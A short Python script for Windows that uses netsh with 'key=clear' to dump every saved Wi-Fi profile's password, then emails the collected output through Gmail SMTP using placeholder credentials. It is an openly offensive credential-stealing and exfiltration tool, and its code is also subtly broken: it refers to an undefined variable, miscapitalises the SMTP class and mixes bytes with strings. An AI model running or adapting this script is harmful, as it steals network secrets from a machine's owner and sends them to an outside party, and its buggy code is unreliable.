#!/usr/bin/python

import subprocess
import smtplib
import re


command1 = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_list = re.findall('(?:Profile\s*:\s)(.*)', networks)

final_output = ""

for network in network_list:
    command2 = "netsh wlan show profile " + network + " key=clear"
    one_network_result = subprocess.check_output(command2, shell=True)
    final_output += one_network_result

sender_email = "putyourownemailnotmine@gmail.com"
sender_password = "againputyourownpassword"
reciever_email = "putyourotheremail@gmail.com"

server = smtplib.smtp("smtp.gmail.com", 587)
server.starttls()
server.login(sender_email,sender_password) #Variables for sender's email and password
server.sendmail(sender_email, reciever_email, final_output) #Variables for sender's email, reciever's email and the message(In this case final_output)
server.quit()
